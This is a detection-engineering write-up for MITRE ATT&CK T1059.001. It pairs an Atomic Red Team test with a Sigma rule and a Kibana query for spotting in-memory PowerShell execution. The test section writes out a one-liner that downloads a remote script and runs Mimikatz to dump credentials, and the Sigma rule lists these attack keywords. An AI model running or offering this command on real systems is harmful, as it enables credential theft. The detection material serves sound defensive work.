# T1059.001 – PowerShell Execution

## Technique Description

**MITRE ATT&CK ID:** T1059.001
**Tactic:** Execution 
**Platform:** Windows

Adversaries abuse PowerShell to execute malicious commands and scripts on compromised systems. PowerShell provides extensive access to system functionality and allows attackers to execute code directly in memory, reducing reliance on disk-based artifacts and evading traditional security controls.

Attackers frequently leverage PowerShell’s Invoke-Expression (IEX) cmdlet combined with Net.WebClient.DownloadString() to retrieve and execute malicious scripts from remote locations. This technique is commonly used to deploy credential dumping tools, download additional payloads, and perform post-exploitation actions.

**Real-World Usage:**  
Threat actors like **APT33** have extensively abused PowerShell for in-memory execution and credential access during post-exploitation phases.

---

## Atomic Red Team Test

**Test Number:** Test #1  
**Supported Platforms:** Windows

### Test Command
```
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
```

**Parameters:**
- `powershell.exe` - Launches PowerShell interpreter

- `IEX` - Executes downloaded code directly in memory

- `Net.WebClient + DownloadString()` - Downloads a remote PowerShell script

- `Invoke-Mimikatz` - Runs Mimikatz from memory

- `-DumpCreds` - Dumps credentials from the system

### Expected Behavior
When executed, PowerShell downloads a remote script and executes it directly in memory without writing files to disk. The script invokes Mimikatz functionality to extract credentials from the system, enabling credential theft while minimizing forensic artifacts.

---

## Sigma Rule

```yaml
title: Suspicious PowerShell In-Memory Execution
id: a91d2c34-t1059-001-powershell
status: experimental
description: Detects suspicious PowerShell execution involving in-memory script execution and remote payload retrieval
references:
  - https://attack.mitre.org/techniques/T1059/001
  - https://github.com/redcanaryco/atomic-red-team
author: Ghofrane Amemi
date: 2026-01-27
tags:
  - attack.execution
  - attack.t1059.001
  - atomic_red_team

logsource:
  product: windows
  category: process_creation
  service: sysmon

detection:
  selection_powershell:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - 'IEX'
      - 'Invoke-Expression'
      - 'DownloadString'
      - 'Net.WebClient'
      - 'Invoke-Mimikatz'

  condition: selection_powershell

falsepositives:
  - Security testing or red team exercises
  - Advanced PowerShell automation pulling remote modules
  - Incident response scripts executed by security teams

level: high

```
---

## Kibana Detection Query

**Rule Name:** T1059.001 – PowerShell In-Memory Execution
**Severity:** High

### KQL Query
```kql
winlog.channel: "Microsoft-Windows-Sysmon/Operational"
AND event.code: "1"
AND process.name: "powershell.exe"
AND process.command_line.text: (*IEX* AND *DownloadString*)
```

### Required Data Sources
- **Log Source:** Sysmon
- **Event ID:** 1 (Process Creation)
- **Channel:** Microsoft-Windows-Sysmon/Operational

---

## Limitations

This detection does not cover:
- PowerShell executed via encoded commands (-EncodedCommand)
- PowerShell remoting without command-line visibility
- Script execution through PowerShell runspaces or .NET reflection